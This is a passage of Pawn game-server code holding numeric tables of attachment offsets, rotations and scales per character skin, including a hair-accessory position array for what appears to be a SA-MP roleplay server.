	{0.102086, 0.027493, -0.001635, 90.928329, 87.672645, 0.000000, 1.000000}, // - 84
	{0.081954, 0.041672, -0.001635, 90.928329, 87.672645, 0.000000, 1.000000}, // - 85
	{0.025608, -0.003408, 281.516479, 106.686721, 167.551193, 0.965358}, // - 86
	{0.077010, 0.046925, -0.003438, 90.928329, 91.590301, 0.000000, 1.000000}, // - 87
	{0.069952, 0.042635, -0.003438, 90.928329, 86.722587, 0.000000, 1.000000}, // - 88
	{0.093827, 0.019258, -0.003438, 90.928329, 86.722587, 0.000000, 1.000000}, // - 89
	{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000, 1.000000}, // - 90
	{0.066464, 0.035685, -0.000843, 90.928329, 86.722587, 0.000000, 1.000000}, // - 91
	{0.066464, 0.038135, -0.000843, 90.928329, 86.722587, 0.000000, 1.000000}, // - 92
	{0.066464, 0.038135, -0.001690, 90.928329, 86.722587, 0.000000, 1.000000}, // - 93
	{0.048124, 0.010598, -0.001690, 90.928329, 86.722587, 0.000000, 1.000000}, // - 94
	{0.084997, 0.006773, -0.001690, 90.928329, 86.722587, 0.000000, 1.000000}, // - 95
	{0.100076, 0.026633, -0.001690, 90.928329, 80.020179, 0.000000, 1.000000}, // - 96
	{0.061686, 0.027537, -0.001690, 90.928329, 80.020179, 0.000000, 1.000000}, // - 97
	{0.098318, 0.053993, -0.001690, 90.928329, 89.237678, 0.000000, 1.000000}, // - 98
	{0.098318, 0.033702, -0.001690, 90.928329, 89.237678, 0.000000, 1.000000}, // - 99
	{0.086149, 0.042526, -0.001690, 90.928329, 77.587478, 0.000000, 1.000000}, // - 100
	{0.081864, 0.030555, -0.001690, 90.928329, 78.145759, 0.000000, 1.000000}, // - 101
	{0.081864, 0.047914, -0.005079, 90.928329, 78.145759, 0.000000, 1.000000}, // - 102
	{0.089607, 0.036717, -0.005079, 90.928329, 78.145759, 0.000000, 1.000000}, // - 103
	{0.079655, 0.042021, -0.005079, 90.928329, 78.145759, 0.000000, 1.000000}, // - 104
	{0.091779, 0.037620, -0.005079, 90.928329, 78.145759, 0.000000, 1.000000}, // - 105
	{0.084179, 0.035251, -0.005079, 90.928329, 78.145759, 0.000000, 1.000000}, // - 106
	{0.089387, 0.040297, -0.006006, 90.928329, 78.145759, 0.000000, 1.000000}, // - 107
	{0.081930, 0.030756, 0.001523, 90.928329, 78.145759, 0.000000, 1.000000},  // - 108
	{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000, 1.000000}, // - 109
	{0.092857, 0.043070, -0.006084, 90.928329, 85.326652, 0.000000, 1.000000}, // - 110
	{0.106601, 0.028021, -0.003537, 90.928329, 90.217376, 0.000000, 1.000000}, // - 111
	{0.096335, 0.015873, -0.003537, 90.928329, 90.217376, 0.000000, 1.000000}, // - 112
	{0.105827, 0.046620, -0.001395, 90.928329, 90.217376, 0.000000, 1.000000}, // - 113
	{0.097520, 0.044296, -0.007286, 90.928329, 90.217376, 0.000000, 1.000000}, // - 114
	{0.097408, 0.043470, -0.007286, 90.928329, 90.217376, 0.000000, 1.000000}, // - 115
	{0.092588, 0.049832, -0.007286, 90.928329, 90.217376, 0.000000, 1.000000}, // - 116
	{0.081444, 0.037602, -0.003125, 90.928329, 90.217376, 0.000000, 1.000000}, // - 117
	{0.078678, 0.037602, -0.001816, 90.928329, 90.217376, 0.000000, 1.000000}, // - 118
	{0.093011, 0.037032, -0.001987, 281.516479, 94.968688, 167.551193, 1.051324}, // - 119
	{0.089214, 0.029291, -0.000784, 90.928329, 84.624763, 0.000000, 1.000000}, // - 120
	{0.086825, 0.033424, -0.000784, 90.928329, 77.233818, 0.000000, 1.000000}, // - 121
	{0.082869, 0.030783, -0.000950, 90.928329, 77.233818, 0.000000, 1.000000}, // - 122
	{0.096117, 0.048957, -0.006245, 90.928329, 87.579650, 0.000000, 1.000000}, // - 123
	{0.103663, 0.040022, 0.000449, 90.928329, 87.579650, 0.000000, 1.000000},  // - 124
	{0.099326, 0.031202, -0.001180, 90.928329, 87.579650, 0.000000, 1.000000}, // - 125
	{0.099326, 0.031132, -0.001180, 90.928329, 87.579650, 0.000000, 1.000000}, // - 126
	{0.099326, 0.039279, -0.001180, 90.928329, 87.579650, 0.000000, 1.000000}, // - 127
	{0.099326, 0.047422, -0.001180, 90.928329, 87.579650, 0.000000, 1.000000}, // - 128
	{0.088817, 0.021210, 0.000730, 90.928329, 87.579650, 0.000000, 1.000000},  // - 129
	{0.025784, 0.028323, 0.000730, 90.928329, 59.394767, 0.000000, 1.000000},  // - 130
	{0.068455, 0.031841, -0.004470, 90.928329, 79.979003, 0.000000, 1.000000}, // - 131
	{0.012930, 0.008392, -0.004470, 90.928329, 72.129173, 0.000000, 1.000000}, // - 132
	{0.102457, 0.032260, -0.003338, 90.928329, 84.534217, 0.000000, 1.000000}, // - 133
	{0.085976, 0.014956, -0.003338, 90.928329, 80.308830, 0.000000, 1.000000}, // - 134
	{0.071574, 0.028186, -0.001588, 90.928329, 80.308830, 0.000000, 1.000000}, // - 135
	{0.085219, 0.016666, -0.000738, 90.928329, 80.308830, 0.000000, 1.000000}, // - 136
	{0.065114, 0.009318, -0.000738, 90.928329, 80.308830, 0.000000, 1.000000}, // - 137
	{0.066890, 0.040024, -0.000738, 90.928329, 87.341934, 0.000000, 1.000000}, // - 138
	{0.072037, 0.036141, -0.000702, 90.928329, 87.341934, 0.000000, 1.000000}, // - 139
	{0.069108, 0.042194, -0.000436, 90.928329, 87.341934, 0.000000, 1.000000}, // - 140
	{0.058717, 0.043547, -0.000436, 90.928329, 87.209770, 0.000000, 1.000000}, // - 141
	{0.104196, 0.039601, -0.005481, 90.928329, 87.209770, 0.000000, 1.000000}, // - 142
	{0.090929, 0.045881, -0.012780, 90.928329, 87.209770, 0.000000, 1.000000}, // - 143
	{0.098291, 0.042464, -0.006952, 90.928329, 83.081665, 0.000000, 1.000000}, // - 144
	{0.080087, 0.030122, 0.000606, 90.928329, 83.081665, 0.000000, 1.000000},  // - 145
	{0.093500, 0.030690, -0.001545, 90.928329, 83.081665, 0.000000, 1.000000}, // - 146
	{0.079566, 0.020138, 0.004838, 90.928329, 73.715591, 0.000000, 1.000000},  // - 147
	{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000, 1.000000}, // - 148
	{0.099901, 0.011976, 0.001273, 281.516479, 97.607620, 167.551193, 1.190787}, // - 149
	{0.073564, 0.028430, -0.000527, 90.928329, 88.295433, 0.000000, 1.000000}, // - 150
	{0.083426, 0.032359, -0.005717, 90.928329, 88.295433, 0.000000, 1.000000}, // - 151
	{0.072349, 0.019623, -0.000747, 90.928329, 82.624351, 0.000000, 1.000000}, // - 152
	{0.075065, 0.015351, 0.006545, 90.928329, 71.041442, 0.000000, 1.000000},  // - 153
	{0.062227, 0.029731, -0.004938, 90.928329, 84.602760, 0.000000, 1.000000}, // - 154
	{0.0, 0.0, 0.0, 0.0, 0.0, 0.0}, // - 155
	{0.079936, 0.049000, -0.000304, 90.928329, 82.926010, 0.000000, 1.000000}, // - 156
	{0.067550, 0.035686, -0.000017, 90.928329, 82.926010, 0.000000, 1.000000}, // - 157
	{0.090676, 0.039383, -0.001726, 90.928329, 88.667900, 0.000000, 1.000000}, // - 158
	{0.090676, 0.039383, -0.003532, 90.928329, 88.667900, 0.000000, 1.000000}, // - 159
	{0.098662, 0.017441, -0.001589, 90.928329, 88.667900, 0.000000, 1.000000}, // - 160
	{0.105388, 0.038409, 0.003155, 90.928329, 88.667900, 0.000000, 1.000000},  // - 161
	{0.097415, 0.036904, -0.000525, 90.928329, 88.667900, 0.000000, 1.000000}, // - 162
	{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000, 1.000000}, // - 163
	{0.088934, 0.023302, -0.004153, 90.928329, 80.393875, 0.000000, 1.000000}, // - 164
	{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000, 1.000000},  // - 165
	{0.087018, 0.051364, 0.000484, 90.928329, 94.584838, 0.000000, 1.000000},  // - 166
	{0.095996, 0.038787, 0.000484, 90.928329, 84.315711, 0.000000, 1.000000},  // - 167
	{0.089094, 0.034001, -0.006451, 90.928329, 84.315711, 0.000000, 1.000000}, // - 168
	{0.075700, 0.028082, -0.006451, 90.928329, 84.315711, 0.000000, 1.000000}, // - 169
	{0.093751, 0.041968, -0.005545, 90.928329, 84.315711, 0.000000, 1.000000}, // - 170
	{0.090124, 0.031055, -0.000505, 90.928329, 84.315711, 0.000000, 1.000000}, // - 171
	{0.066033, 0.032915, -0.002713, 90.928329, 84.315711, 0.000000, 1.000000}, // - 172
	{0.088287, 0.045350, -0.005384, 90.928329, 84.315711, 0.000000, 1.000000}, // - 173
	{0.087750, 0.042129, -0.005384, 90.928329, 84.315711, 0.000000, 1.000000}, // - 174
	{0.092384, 0.039294, -0.005384, 90.928329, 84.315711, 0.000000, 1.000000}, // - 175
	{0.097661, 0.039065, -0.006344, 90.928329, 80.736480, 0.000000, 1.000000}, // - 176
	{0.097114, 0.039641, -0.006692, 90.928329, 80.736480, 0.000000, 1.000000}, // - 177
	{0.069354, 0.039641, -0.000474, 90.928329, 80.736480, 0.000000, 1.000000}, // - 178
	{0.091414, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000, 1.000000}, // - 179
	{0.094914, 0.039641, -0.005617, 90.928329, 80.736480, 0.000000, 1.000000}, // - 180
	{0.117232, 0.033217, -0.001099, 90.928329, 82.396362, 0.000000, 1.000000}, // - 181
	{0.082569, 0.032748, -0.003248, 90.928329, 87.394371, 0.000000, 1.000000}, // - 182
	{0.095527, 0.027237, -0.001960, 90.928329, 86.443649, 0.000000, 1.000000}, // - 183
	{0.095527, 0.040994, -0.006878, 90.928329, 86.443649, 0.000000, 1.000000}, // - 184
	{0.085663, 0.030601, -0.002345, 90.928329, 81.496513, 0.000000, 1.000000}, // - 185
	{0.085663, 0.030601, -0.001015, 90.928329, 81.496513, 0.000000, 1.000000}, // - 186
	{0.076527, 0.027211, 0.008500, 90.928329, 74.401092, 0.000000, 1.000000},  // - 187
	{0.096669, 0.032578, 0.001662, 90.928329, 83.502502, 0.000000, 1.000000},  // - 188
	{0.098753, 0.032129, -0.001659, 90.928329, 90.153724, 0.000000, 1.000000}, // - 189
	{0.092821, 0.035572, -0.001659, 90.928329, 90.153724, 0.000000, 1.000000}, // - 190
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 191
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 192
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 193
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 194
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 195
	{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 196
	{0.100630, 0.020568, -0.001132, 90.928329, 90.153724, 0.000000, 1.000000}, // - 197
	{0.077905, 0.028523, 0.000000, 89.675476, 89.270309, 0.000000, 1.000000},  // - 198
	{0.099095, 0.022463, 0.000000, 89.675476, 89.270309, 0.000000, 1.000000},  // - 199
	{0.103182, 0.031106, 0.000000, 89.675476, 89.270309, 0.000000, 1.000000},  // - 200
	{0.078426, 0.038546, 0.000000, 89.675476, 89.270309, 0.000000, 1.000000},  // - 201
	{0.101092, 0.035797, -0.002997, 89.675476, 82.081153, 0.000000, 1.000000}, // - 202
	{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000, 1.000000}, // - 203
	{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000, 1.000000}, // - 204
	{0.092969, 0.027782, -0.002959, 89.675476, 84.463294, 0.000000, 1.000000}, // - 205
	{0.105109, 0.036128, -0.000471, 89.675476, 84.463294, 0.000000, 1.000000}, // - 206
	{0.066892, 0.024410, -0.002792, 89.675476, 84.463294, 0.000000, 1.000000}, // - 207
	{0.088610, 0.043561, 0.001273, 281.516479, 89.674781, 167.551193, 1.000000}, // - 208
	{0.084046, 0.013608, -0.002792, 89.675476, 81.667831, 0.000000, 1.000000}, // - 209
	{0.084046, 0.013608, -0.001034, 89.675476, 81.667831, 0.000000, 1.000000}, // - 210
	{0.067610, 0.033777, -0.001034, 89.675476, 85.214485, 0.000000, 1.000000}, // - 211
	{0.094159, 0.020717, 0.000715, 89.675476, 85.214485, 0.000000, 1.000000},  // - 212
	{0.098744, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000, 1.000000}, // - 213
	{0.068755, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000, 1.000000}, // - 214
	{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000, 1.000000}, // - 215
	{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000, 1.000000}, // - 216
	{0.095765, 0.030034, -0.001770, 89.675476, 85.214485, 0.000000, 1.000000}, // - 217
	{0.085486, 0.039427, -0.003311, 89.675476, 85.214485, 0.000000, 1.000000}, // - 218
	{0.068874, 0.027850, -0.001021, 89.675476, 85.214485, 0.000000, 1.000000}, // - 219
	{0.052931, 0.050390, -0.002062, 89.675476, 88.113647, 0.000000, 1.000000}, // - 220
	{0.094479, 0.034432, 0.000875, 89.675476, 83.572830, 0.000000, 1.000000},  // - 221
	{0.094479, 0.034432, -0.000596, 89.675476, 83.572830, 0.000000, 1.000000}, // - 222
	{0.094479, 0.062073, -0.003098, 89.675476, 83.572830, 0.000000, 1.000000}, // - 223
	{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000, 1.000000}, // - 224
	{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000, 1.000000}, // - 225
	{0.072095, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000, 1.000000}, // - 226
	{0.110619, 0.043037, -0.001466, 89.675476, 86.927627, 0.000000, 1.000000}, // - 227
	{0.099446, 0.050772, -0.001466, 89.675476, 85.103805, 0.000000, 1.000000}, // - 228
	{0.078635, 0.023680, -0.000275, 89.675476, 73.445220, 0.000000, 1.000000}, // - 229
	{0.043357, 0.028726, -0.000275, 89.675476, 73.445220, 0.000000, 1.000000}, // - 230
	{0.092488, 0.049972, -0.000275, 89.675476, 88.981941, 0.000000, 1.000000}, // - 231
	{0.092488, 0.016739, -0.000275, 89.675476, 88.981941, 0.000000, 1.000000}, // - 232
	{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000, 1.000000}, // - 233
	{0.082745, 0.004209, -0.002878, 89.675476, 88.981941, 0.000000, 1.000000}, // - 234
	{0.057909, 0.021331, -0.002878, 89.675476, 88.981941, 0.000000, 1.000000}, // - 235
	{0.079016, 0.021331, -0.000419, 89.675476, 77.678733, 0.000000, 1.000000}, // - 236
	{0.074572, 0.021331, -0.000419, 89.675476, 84.527442, 0.000000, 1.000000}, // - 237
	{0.074572, 0.038346, -0.001500, 89.675476, 84.527442, 0.000000, 1.000000}, // - 238
	{0.111645, 0.011549, 0.006237, 89.675476, 84.527442, 0.000000, 1.000000},  // - 239
	{0.090766, 0.044221, -0.000423, 89.675476, 89.461883, 0.000000, 1.000000}, // - 240
	{0.069491, 0.049021, -0.000423, 89.675476, 89.461883, 0.000000, 1.000000}, // - 241
	{0.059706, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000, 1.000000}, // - 242
	{0.065242, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000, 1.000000}, // - 243
	{0.065242, 0.051077, -0.001103, 89.675476, 89.461883, 0.000000, 1.000000}, // - 244
	{0.082393, 0.038233, 0.000410, 89.675476, 89.461883, 0.000000, 1.000000},  // - 245
	{0.079338, 0.044859, -0.002535, 89.675476, 89.461883, 0.000000, 1.000000}, // - 246
	{0.101566, 0.037019, 0.000750, 89.675476, 83.514060, 0.000000, 1.000000},  // - 247
	{0.091887, 0.047776, -0.000040, 89.675476, 83.514060, 0.000000, 1.000000}, // - 248
	{0.089745, 0.044044, 0.004071, 89.675476, 83.514060, 0.000000, 1.000000},  // - 249
	{0.094214, 0.044044, -0.007274, 89.675476, 83.514060, 0.000000, 1.000000}, // - 250
	{0.072282, 0.044044, -0.001468, 89.675476, 90.444763, 0.000000, 1.000000}, // - 251
	{0.095764, 0.034224, -0.000264, 89.675476, 82.959915, 0.000000, 1.000000}, // - 252
	{0.087454, 0.026208, -0.000264, 89.675476, 82.959915, 0.000000, 1.000000}, // - 253
	{0.099198, 0.037362, -0.000264, 89.675476, 82.959915, 0.000000, 1.000000}, // - 254
	{0.070845, 0.019943, 0.003505, 89.675476, 73.529716, 0.000000, 1.000000},  // - 255
	{0.065373, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000, 1.000000}, // - 256
	{0.070077, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000, 1.000000}, // - 257
	{0.089536, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000, 1.000000},  // - 258
	{0.084822, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000, 1.000000},  // - 259
	{0.093009, 0.031491, -0.001568, 89.675476, 83.002151, 0.000000, 1.000000}, // - 260
	{0.093009, 0.015023, -0.001477, 89.675476, 83.002151, 0.000000, 1.000000}, // - 261
	{0.076580, 0.039782, -0.001477, 89.675476, 88.620780, 0.000000, 1.000000}, // - 262
	{0.076580, 0.028967, -0.001477, 89.675476, 88.620780, 0.000000, 1.000000}, // - 263
	{0.075424, 0.043059, -0.001477, 89.675476, 88.620780, 0.000000, 1.000000}, // - 264
	{0.089655, 0.021726, -0.001477, 89.675476, 88.620780, 0.000000, 1.000000}, // - 265
	{0.096792, 0.014114, -0.003062, 89.675476, 85.166038, 0.000000, 1.000000}, // - 266
	{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000, 1.000000}, // - 267
	{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000, 1.000000}, // - 268
	{0.102252, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000, 1.000000}, // - 269
	{0.102252, 0.024989, 0.000529, 89.675476, 85.166038, 0.000000, 1.000000},  // - 270
	{0.096134, 0.025462, 0.000529, 89.675476, 79.225112, 0.000000, 1.000000},  // - 271
	{0.099226, 0.032663, 0.000529, 89.675476, 79.225112, 0.000000, 1.000000},  // - 272
	{0.080779, 0.028227, -0.001415, 281.516479, 91.776855, 167.551193, 1.061396}, // - 273
	{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000, 1.000000}, // - 274
	{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000, 1.000000}, // - 275
	{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000, 1.000000}, // - 276
	{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000, 1.000000}, // - 277
	{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000, 1.000000}, // - 278
	{0.087652, 0.059379, -0.000201, 89.675476, 88.636062, 0.000000, 1.000000}, // - 279
	{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000, 1.000000}, // - 280
	{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000, 1.000000}, // - 281
	{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000, 1.000000}, // - 282
	{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000, 1.000000}, // - 283
	{0.090877, 0.053674, 0.009879, 89.675476, 88.636062, 0.000000, 1.000000},  // - 284
	{0.104320, 0.041487, 0.008021, 89.675476, 88.636062, 0.000000, 1.000000},  // - 285
	{0.087062, 0.021779, -0.003307, 89.675476, 88.636062, 0.000000, 1.000000}, // - 286
	{0.073173, 0.048856, 0.005337, 89.675476, 92.561180, 0.000000, 1.000000},  // - 287
	{0.090294, 0.027592, -0.003497, 89.675476, 92.561180, 0.000000, 1.000000}, // - 288
	{0.081684, 0.015000, 0.001780, 281.516479, 108.106758, 169.790878, 1.042815}, // - 289
	{0.086562, 0.042698, -0.000612, 89.675476, 92.561180, 0.000000, 1.000000}, // - 290
	{0.096768, 0.039233, -0.000612, 89.675476, 83.550270, 0.000000, 1.000000}, // - 291
	{0.079939, 0.020731, -0.005162, 89.675476, 83.550270, 0.000000, 1.000000}, // - 292
	{0.097107, 0.027826, -0.005162, 89.675476, 88.505996, 0.000000, 1.000000}, // - 293
	{0.097107, 0.037636, 0.000618, 89.675476, 88.505996, 0.000000, 1.000000},  // - 294
	{0.079985, 0.035006, -0.000826, 89.675476, 87.533462, 0.000000, 1.000000}, // - 295
	{0.088445, 0.024209, -0.002076, 89.675476, 73.285072, 0.000000, 1.000000}, // - 296
	{0.094039, 0.035411, 0.000490, 89.675476, 84.277572, 0.000000, 1.000000},  // - 297
	{0.099553, 0.024683, -0.002919, 89.675476, 84.277572, 0.000000, 1.000000}, // - 298
	{0.099553, 0.044356, -0.000285, 89.675476, 84.277572, 0.000000, 1.000000}  // - 299
};

new Float:POS_Accesorio_Pelo[300][9] = {
	{0.108588, -0.004280, 0.000000, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.000000 }, // Hair3 - 0
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 1
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 2
	{0.070000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.399999, 1.500000, 1.200000 }, // Hair3 - 3
	{0.108999, 0.004999, 0.000000, 0.000000, 0.000000, 0.000000, 1.299999, 1.100000, 1.200000 }, // Hair3 - 4
	{0.093999, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.299999, 1.200000, 1.200000 }, // Hair3 - 5
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 6
	{0.099690, 0.006124, -0.003632, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.178597 }, // Hair3 - 7
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 8
	{0.075812, 0.007086, -0.003632, 0.000000, 0.000000, 0.504608, 2.675273, 1.004458, 1.130290 }, // Hair3 - 9
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 10
	{0.073011, -0.000845, 0.005339, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.149878 }, // Hair3 - 11
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 12
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 13
	{0.088216, 0.009086, 0.005339, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.149878 }, // Hair3 - 14
	{0.069295, -0.023192, -0.001476, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 0.998685 }, // Hair3 - 15
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 16
	{0.100861, -0.000708, 0.001642, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.033313 }, // Hair3 - 17
	{0.062683, -0.000708, 0.001642, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.022677 }, // Hair3 - 18
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 19
	{0.097281, -0.006789, 0.000686, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.089968 }, // Hair3 - 20
	{0.080904, -0.002786, -0.005819, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.118435 }, // Hair3 - 21
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 22
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 23
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 24
	{0.080904, 0.002488, -0.000037, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.043299 }, // Hair3 - 25
	{0.062522, 0.013497, -0.000037, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.175585 }, // Hair3 - 26
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 27
	{0.087827, 0.022751, -0.005296, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.219193 }, // Hair3 - 28
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 29
	{0.077708, 0.011525, -0.005296, 0.000000, 0.000000, 0.504608, 1.004458, 1.004458, 1.219193 }, // Hair3 - 30
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 31
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 32
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 33
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 34
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 35
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 36
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 37
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 38
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 39
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 40
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 41
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 42
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 43
	{0.079044, 0.014414, -0.000931, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 0.900948 }, // Hair3 - 44
	{0.060674, 0.006197, -0.000931, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 1.019663 }, // Hair3 - 45
	{0.087941, 0.018147, -0.000931, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 1.139707 }, // Hair3 - 46
	{0.084668, 0.006726, -0.000931, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 1.142034 }, // Hair3 - 47
	{0.099493, -0.017821, -0.002006, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 1.142034 }, // Hair3 - 48
	{0.079672, 0.012987, -0.001040, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 0.986149 }, // Hair3 - 49
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 50
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 51
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 52
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 53
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 54
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 55
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 56
	{0.119527, 0.015450, -0.002653, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 1.060347 }, // Hair3 - 57
	{0.075583, -0.001295, -0.002653, 0.000000, 0.000000, 357.597473, 1.004458, 1.004458, 0.948482 }, // Hair3 - 58
	{0.095139, 0.003601, -0.002653, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.128250 }, // Hair3 - 59
	{0.095139, 0.003562, -0.002653, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.100457 }, // Hair3 - 60
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 61
	{0.093398, 0.018343, 0.006919, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.009026 }, // Hair3 - 62
	{0.084164, -0.001245, 0.000018, 0.000000, 0.000000, 4.176807, 1.004458, 1.004458, 1.179215 }, // Hair3 - 63
	{0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000 }, // Hair3 - 64
